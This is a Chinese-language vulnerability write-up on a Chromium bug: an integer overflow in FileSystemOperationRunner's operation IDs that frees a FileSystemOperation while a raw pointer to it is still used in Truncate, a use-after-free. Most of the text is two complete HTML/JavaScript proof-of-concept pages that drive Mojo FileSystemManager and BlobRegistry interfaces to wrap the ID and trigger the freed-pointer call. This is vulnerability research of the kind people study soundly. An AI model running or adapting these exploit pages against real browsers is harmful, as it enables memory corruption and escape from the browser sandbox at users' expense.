https://bugs.chromium.org/p/chromium/issues/detail?id=925864

### Root case

```
OperationID FileSystemOperationRunner::BeginOperation(
    std::unique_ptr<FileSystemOperation> operation) {
  OperationID id = next_operation_id_++;

  // TODO( https://crbug.com/864351 ): Diagnostic to determine whether OperationID
  // wrap-around is occurring in the wild.
  DCHECK(operations_.find(id) == operations_.end());

  // ! If id already in operations_, this will free operation
  operations_.emplace(id, std::move(operation));
  return id;
}
```

id是一个int，并且他没有对溢出的检测，所以这里存在一个整数溢出。
operations_的定义为map<id, unique_ptr<FileSystemOperation>>，他通过id保存了std::unique_ptr<FileSystemOperation>，由于溢出我们是可以让id成为相同的值两次，我们先接着向下看：

```
OperationID FileSystemOperationRunner::Truncate(const FileSystemURL& url,
                                                int64_t length,
                                                StatusCallback callback) {
  base::File::Error error = base::File::FILE_OK;
  std::unique_ptr<FileSystemOperation> operation = base::WrapUnique(
      file_system_context_->CreateFileSystemOperation(url, &error));
  // ! take a raw pointer to the contents of the unique_ptr
  FileSystemOperation* operation_raw = operation.get();
  // ! call BeginOperation passing the move'd unique_ptr, freeing operation
  OperationID id = BeginOperation(std::move(operation));
  base::AutoReset<bool> beginning(&is_beginning_operation_, true);
  if (!operation_raw) {
    DidFinish(id, std::move(callback), error);
    return id;
  }
  PrepareForWrite(id, url);
  // ! use the raw free'd pointer here.
  operation_raw->Truncate(url, length,
                          base::BindOnce(&FileSystemOperationRunner::DidFinish,
                                         weak_ptr_, id, std::move(callback)));
  return id;
}
```
在FileSystemOperationRunner::Truncate中，他使用了原始指针去调用Truncate：operation_raw->Truncate。

我们总结一下现在的内容：

```
通过溢出可以得到：
operations_.emplace(1, std::move(operation1));
operations_.emplace(overflow(1), std::move(operation2));
```
在overflow(1)的第二次emplace时，因为operations_是一个unique_key的容器，它不允许key相同，所以第二次装入是失败的，operation2这个unique_ptr被析构，且此时它里面保存的原始指针不为空，从而使得指针指向的FileSystemOperation也被析构，operation_raw变成悬空指针。

这样的话operation_raw->Truncate就会触发uaf

### poc

```
<html>
  <body>
    <script src="/mojo/public/js/mojo_bindings.js"></script>
    <script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    <script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
    <script>
var writer = null;
var pipe = null;

async function overflow() {
  var promises = []
  var data = new Uint8Array(1);

  for (var i = 0; i != 0x80000; ++i) {
    promises.push(writer.truncate(1));
  }

  pipe.producer.writeData(data);
  await Promise.all(promises);

  window.setTimeout(overflow, 100);
}

async function file_writer() {
  let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                   mojo.makeRequest(file_system_manager_ptr).handle, "process");

  let host_url = new url.mojom.Url();
  host_url.url = 'http://localhost:7007';

  let open_result = await file_system_manager_ptr.open(host_url, 0);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  writer = (await file_system_manager_ptr.createWriter(file_url)).writer;

  pipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: 1});
  writer.writeStream(0, pipe.consumer);

  overflow();
}

file_writer();
    </script>
  </body>
</html>
```

or

```
<html>
  <body>
    <script src="/mojo/public/js/mojo_bindings.js"></script>
    <script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
    <script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
    <script>
let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                   mojo.makeRequest(blob_registry_ptr).handle, "process");

let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                   mojo.makeRequest(file_system_manager_ptr).handle, "process");

let host_url = new url.mojom.Url();
host_url.url = 'http://localhost:7007';

file_system_manager_ptr.open(host_url, 0).then((open_result) => {
  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  let cancellable_operation_ptr = new blink.mojom.FileSystemCancellableOperationPtr();
  let cancellable_operation_req = mojo.makeRequest(cancellable_operation_ptr);

  function OperationListenerImpl() {
    this.binding = new mojo.Binding(blink.mojom.FileSystemOperationListener, this);
  }

  let operation_listener_impl = new OperationListenerImpl();
  let operation_listener_impl_ptr = new blink.mojom.FileSystemOperationListenerPtr();
  operation_listener_impl.binding.bind(mojo.makeRequest(operation_listener_impl_ptr));

  var blob_id = 0;

  function next_blob() {
    let blob_impl = new NextBlobImpl();
    let blob_impl_ptr = new blink.mojom.BlobPtr();
    blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));

    let data_element = new blink.mojom.DataElement();
    data_element.blob = new blink.mojom.DataElementBlob();
    data_element.blob.blob = blob_impl_ptr;
    data_element.blob.offset = 0;
    data_element.blob.length = 1;

    let blob_ptr = new blink.mojom.BlobPtr();
    let blob_req = mojo.makeRequest(blob_ptr);

    blob_id += 1;
    blob_registry_ptr.register(blob_req, 'blob_' + blob_id.toString(), '', '', [data_element]);

    return 'blob_' + blob_id.toString();
  }

  function FirstBlobImpl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  FirstBlobImpl.prototype = {
    getInternalUUID: (arg0) => {
      file_system_manager_ptr.write(file_url, 'blob_0', 0, cancellable_operation_req,operation_listener_impl_ptr);

      return next_blob();
    }
  };

  function NextBlobImpl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  NextBlobImpl.prototype = {
    getInternalUUID: (arg0) => {
      for (var i = 0; i < 0x10000; ++i) {
        file_system_manager_ptr.truncateSync(file_url, 0);
      };

      return next_blob();
    }
  };

  let blob_impl = new FirstBlobImpl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));

  let data_element = new blink.mojom.DataElement();
  data_element.blob = new blink.mojom.DataElementBlob();
  data_element.blob.blob = blob_impl_ptr;
  data_element.blob.offset = 0;
  data_element.blob.length = 1;

  let blob_ptr = new blink.mojom.BlobPtr();
  let blob_req = mojo.makeRequest(blob_ptr);

  blob_registry_ptr.register(blob_req, 'blob_0', '', '', [data_element]);
});
    </script>
  </body>
</html>
```